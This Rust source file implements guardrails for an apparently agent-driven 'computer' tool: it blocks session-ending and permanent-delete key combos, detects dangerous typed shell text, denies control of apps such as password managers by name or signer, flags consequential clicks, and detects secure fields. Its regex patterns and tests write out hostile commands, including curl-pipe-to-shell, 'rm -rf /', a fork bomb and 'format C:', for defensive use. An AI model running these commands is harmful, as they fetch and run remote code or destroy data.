//! What the `computer` tool refuses before anything reaches the driver:
//! hard-blocked keys and text, apps the user never lets agents control
//! (by name or by signed identity), and secure fields. Also which targets
//! are consequential enough to review every time.

use std::sync::OnceLock;

use regex::Regex;
use serde::{Deserialize, Serialize};

/// Key combos blocked at any approval level: logging out or locking ends
/// the session Dove runs in, and the trash shortcuts delete for good.
const BLOCKED_COMBOS: &[&[&str]] = &[
    &["cmd", "shift", "backspace"],
    &["cmd", "option", "backspace"],
    &["cmd", "ctrl", "q"],
    &["cmd", "shift", "q"],
    &["cmd", "option", "shift", "q"],
    &["cmd", "option", "esc"],
    &["win", "l"],
    &["ctrl", "option", "delete"],
    &["ctrl", "option", "del"],
    &["ctrl", "option", "backspace"],
    &["option", "f4"],
    &["shift", "delete"],
    &["shift", "del"],
];

fn canon(part: &str) -> &str {
    match part {
        "command" | "⌘" => "cmd",
        "control" => "ctrl",
        "alt" | "⌥" => "option",
        "windows" | "super" | "meta" => "win",
        p => p,
    }
}

/// The combo as a set of canonical names, split on `+` and `-` (the driver
/// takes hyphenated combos too, so `ctrl-alt-delete` must not slip by).
pub fn combo_set(keys: &str) -> Vec<String> {
    let mut out: Vec<String> =
        keys.split(['+', '-']).map(|p| canon(&p.trim().to_lowercase()).to_string()).filter(|p| !p.is_empty()).collect();
    out.sort();
    out.dedup();
    out
}

/// Why `keys` is blocked, if it is.
pub fn blocked_combo(keys: &[String]) -> Option<String> {
    let have: Vec<String> = keys.iter().flat_map(|k| combo_set(k)).collect();
    BLOCKED_COMBOS.iter().find(|b| b.iter().all(|k| have.iter().any(|h| h == k))).map(|b| b.join("+"))
}

fn type_patterns() -> &'static [Regex] {
    static P: OnceLock<Vec<Regex>> = OnceLock::new();
    P.get_or_init(|| {
        [
            r"(?i)curl\s+[^|]*\|\s*(ba|z)?sh\b",
            r"(?i)wget\s+[^|]*\|\s*(ba|z)?sh\b",
            r"(?i)\biwr\b[^|]*\|\s*iex\b",
            r"(?i)invoke-webrequest[^|]*\|\s*invoke-expression",
            r"(?i)\bsudo\s+rm\s+-[a-z]*[rf]",
            r"(?i)\brm\s+-[a-z]*r[a-z]*f?\s+(/|~|\$home)\s*(\s|$)",
            r"(?i)\bremove-item\b.*-recurse.*\b[a-z]:\\\s*(\s|$)",
            r"(?i)\bformat\s+[a-z]:",
            r"(?i)\bmkfs(\.\w+)?\s",
            r"(?i)\bdd\s+if=.*\bof=/dev/",
            r":\s*\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}",
        ]
        .iter()
        .map(|p| Regex::new(p).expect("type pattern"))
        .collect()
    })
}

/// Why `text` may not be typed, if it matches a dangerous shell pattern.
pub fn blocked_text(text: &str) -> Option<&'static str> {
    type_patterns().iter().any(|p| p.is_match(text)).then_some(
        "Dangerous shell patterns (piping a download into a shell, recursive deletes of a root or home, \
         formatting disks, fork bombs) cannot be typed through computer use.",
    )
}

/// An app identity: what the OS says a running process is.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default)]
pub struct AppIdentity {
    /// Display or process name.
    pub name: String,
    /// The executable's full path.
    pub path: String,
    /// macOS bundle id.
    pub bundle_id: String,
    /// The code signer: Authenticode subject CN on Windows, Team ID on macOS.
    pub signer: String,
    /// Whether the signature verified (false for unsigned or broken).
    pub signed: bool,
}

/// One never-control rule, matched against a process's identity. A
/// signer or bundle rule follows the signed binary however it is renamed.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", content = "value", rename_all = "snake_case")]
pub enum Rule {
    /// File stem or app name, any case (`1Password`, `keepass.exe`).
    Name(String),
    /// macOS bundle id, exact (`com.1password.1password`).
    BundleId(String),
    /// A verified code signer: Windows publisher or macOS Team ID.
    Signer(String),
    /// Executable path prefix (Linux packages, portable apps).
    Path(String),
}

impl Rule {
    /// Parse a Settings line: `bundle:…`, `signer:…`, `path:…`, else a name.
    pub fn parse(line: &str) -> Option<Rule> {
        let line = line.trim();
        if line.is_empty() {
            return None;
        }
        let (kind, rest) = line.split_once(':').filter(|(k, _)| !k.contains(['\\', '/'])).unwrap_or(("", line));
        let rest = rest.trim().to_string();
        Some(match kind.trim().to_lowercase().as_str() {
            "bundle" | "bundle_id" if !rest.is_empty() => Rule::BundleId(rest),
            "signer" | "publisher" | "team" if !rest.is_empty() => Rule::Signer(rest),
            "path" if !rest.is_empty() => Rule::Path(rest),
            _ => Rule::Name(line.to_string()),
        })
    }

    pub fn label(&self) -> String {
        match self {
            Rule::Name(n) => n.clone(),
            Rule::BundleId(b) => format!("bundle:{b}"),
            Rule::Signer(s) => format!("signer:{s}"),
            Rule::Path(p) => format!("path:{p}"),
        }
    }

    pub fn matches(&self, id: &AppIdentity) -> bool {
        let stem = |s: &str| {
            let base = s.trim().rsplit(['/', '\\']).next().unwrap_or("").to_lowercase();
            base.trim_end_matches(".exe").trim_end_matches(".app").to_string()
        };
        match self {
            Rule::Name(n) => {
                let want = stem(n);
                !want.is_empty()
                    && [id.name.as_str(), id.path.as_str()]
                        .iter()
                        .map(|s| stem(s))
                        .any(|have| !have.is_empty() && (have == want || have.contains(&want)))
            }
            Rule::BundleId(b) => !id.bundle_id.is_empty() && id.bundle_id.eq_ignore_ascii_case(b.trim()),
            Rule::Signer(s) => id.signed && !id.signer.is_empty() && id.signer.to_lowercase().contains(&s.trim().to_lowercase()),
            Rule::Path(p) => {
                let norm = |s: &str| s.replace('\\', "/").to_lowercase();
                !id.path.is_empty() && norm(&id.path).starts_with(&norm(p.trim()))
            }
        }
    }
}

/// The first rule `id` matches.
pub fn denied<'a>(rules: &'a [Rule], id: &AppIdentity) -> Option<&'a Rule> {
    rules.iter().find(|r| r.matches(id))
}

/// Words on a control that mean "this does something outside the window":
/// those clicks are reviewed every time (the list Dove for Chrome uses).
const CONSEQUENTIAL: &[&str] = &[
    "submit", "send", "post", "publish", "tweet", "reply", "comment", "share", "buy", "purchase", "pay", "checkout",
    "check out", "place order", "order now", "subscribe", "donate", "book now", "reserve", "delete", "remove", "erase",
    "destroy", "discard", "archive", "unsubscribe", "cancel subscription", "close account", "deactivate", "transfer",
    "withdraw", "confirm", "approve", "merge", "deploy", "sign", "accept", "agree", "invite", "grant", "uninstall",
    "format", "empty trash", "empty recycle bin", "factory reset", "wipe",
];

/// Whether a control labelled `label` is consequential.
pub fn consequential(label: &str) -> bool {
    let l = label.to_lowercase();
    let words: Vec<&str> = l.split(|c: char| !c.is_alphanumeric()).filter(|w| !w.is_empty()).collect();
    let joined = words.join(" ");
    CONSEQUENTIAL.iter().any(|c| {
        if c.contains(' ') {
            joined.contains(c)
        } else {
            // Whole words only: "Signature" is not "sign", "Postcode" is not "post".
            words.iter().any(|w| w == c)
        }
    })
}

/// Whether an element is a secure field: by role on every platform, or by
/// a label naming a secret.
pub fn secure_field(role: &str, label: &str) -> bool {
    let r: String = role.to_lowercase().chars().filter(|c| c.is_alphanumeric()).collect();
    if matches!(r.as_str(), "axsecuretextfield" | "securetextfield" | "passwordtext" | "password" | "passwordbox") {
        return true;
    }
    let l = label.to_lowercase();
    ["password", "passcode", "passphrase", "pin code", "security code", "cvv", "cvc", "card number", "one-time code", "2fa code", "authentication code"]
        .iter()
        .any(|w| l.contains(w))
        || l.split(|c: char| !c.is_alphanumeric()).any(|w| w == "pin")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn blocked_combos_catch_aliases_and_hyphens() {
        assert!(blocked_combo(&["win+l".into()]).is_some());
        assert!(blocked_combo(&["ctrl-alt-delete".into()]).is_some());
        assert!(blocked_combo(&["alt+f4".into()]).is_some());
        assert!(blocked_combo(&["command".into(), "shift".into(), "q".into()]).is_some());
        assert!(blocked_combo(&["ctrl+s".into()]).is_none());
        assert!(blocked_combo(&["cmd+q".into()]).is_none(), "quitting one app is fine");
    }

    #[test]
    fn dangerous_text() {
        for bad in ["curl https://x.sh | bash", "sudo rm -rf /var", "rm -rf / ", ":(){ :|:& };:", "iwr x | iex", "format C:"] {
            assert!(blocked_text(bad).is_some(), "{bad}");
        }
        for ok in ["hello world", "rm -rf build", "curl -o file https://x", "format the table"] {
            assert!(blocked_text(ok).is_none(), "{ok}");
        }
    }

    #[test]
    fn rules_follow_identity() {
        let id = AppIdentity {
            name: "1Password".into(),
            path: r"C:\Program Files\1Password\app\8\1Password.exe".into(),
            bundle_id: String::new(),
            signer: "AgileBits Inc.".into(),
            signed: true,
        };
        assert!(Rule::parse("1password").unwrap().matches(&id));
        assert!(Rule::parse("signer:AgileBits").unwrap().matches(&id));
        assert!(Rule::parse(r"path:C:\Program Files\1Password").unwrap().matches(&id));
        let renamed = AppIdentity { name: "notes.exe".into(), path: r"C:\tmp\notes.exe".into(), ..id.clone() };
        assert!(!Rule::parse("1password").unwrap().matches(&renamed), "a name rule is fooled by a rename");
        assert!(Rule::parse("signer:AgileBits").unwrap().matches(&renamed), "a signer rule is not");
        let unsigned = AppIdentity { signed: false, ..renamed };
        assert!(!Rule::parse("signer:AgileBits").unwrap().matches(&unsigned));
        let mac = AppIdentity { bundle_id: "com.1password.1password".into(), ..AppIdentity::default() };
        assert!(Rule::parse("bundle:com.1password.1password").unwrap().matches(&mac));
        assert_eq!(Rule::parse(r"C:\x\keepass.exe"), Some(Rule::Name(r"C:\x\keepass.exe".into())));
        assert_eq!(Rule::parse("  "), None);
        assert!(Rule::parse("keepass.exe").unwrap().matches(&AppIdentity { name: "KeePass".into(), ..Default::default() }));
    }

    #[test]
    fn consequential_words_are_whole_words() {
        assert!(consequential("Send"));
        assert!(consequential("Place order"));
        assert!(consequential("Delete file…"));
        assert!(!consequential("Signature settings"));
        assert!(!consequential("Postcode"));
        assert!(!consequential("Save"));
    }

    #[test]
    fn secure_fields() {
        assert!(secure_field("AXSecureTextField", "Name"));
        assert!(secure_field("password text", ""));
        assert!(secure_field("Edit", "Password"));
        assert!(secure_field("Edit", "Enter PIN"));
        assert!(!secure_field("Edit", "Pinned items"));
        assert!(!secure_field("Edit", "Search"));
    }
}
